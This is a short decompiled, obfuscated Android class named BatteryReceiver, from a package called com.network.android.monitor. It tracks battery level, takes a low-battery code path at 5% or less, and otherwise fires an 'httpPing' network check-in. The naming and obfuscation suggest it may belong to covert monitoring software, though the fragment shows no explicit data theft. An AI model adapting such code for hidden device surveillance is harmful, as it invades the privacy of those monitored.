package com.network.android.monitor.observer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.HandlerThread;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.android.j;

public class BatteryReceiver extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    public static String f85a = "Charging";
    private static String b = null;
    private static String c = "";
    private static String d = "";
    private static String e = "";
    private static String f = "";
    private static int g = 100;
    private static int h = -1;
    private static Handler i;

    static {
        HandlerThread handlerThread = new HandlerThread("batteryHandler");
        handlerThread.start();
        i = new Handler(handlerThread.getLooper());
    }

    public static int a() {
        return h;
    }

    public static String a(Context context) {
        if (b == null || b.equals("")) {
            a(context.registerReceiver(null, new IntentFilter("android.intent.action.BATTERY_CHANGED")), context);
        }
        return b;
    }

    protected static void a(Intent intent, Context context) {
        if (intent != null) {
            try {
                if (intent.getAction().equals("android.intent.action.BATTERY_CHANGED")) {
                    g = intent.getIntExtra("level", 0);
                    h = intent.getIntExtra("plugged", -1);
                    b = String.valueOf(intent.getIntExtra("level", 0));
                    boolean a2 = a(5);
                    if (a2) {
                        a.a("BatteryReceiver low battary: " + g);
                        j.a(context, true, a2, (short) 37);
                    } else if (!j.b) {
                        c.a(context, "httpPing");
                    }
                }
            } catch (Throwable th) {
                a.a("BatteryReceiver onReceive: " + th.getMessage(), th);
            }
        }
    }

    public static boolean a(int i2) {
        return g <= i2;
    }

    public void onReceive(Context context, Intent intent) {
        i.post(new s(this, intent, context));
    }
}
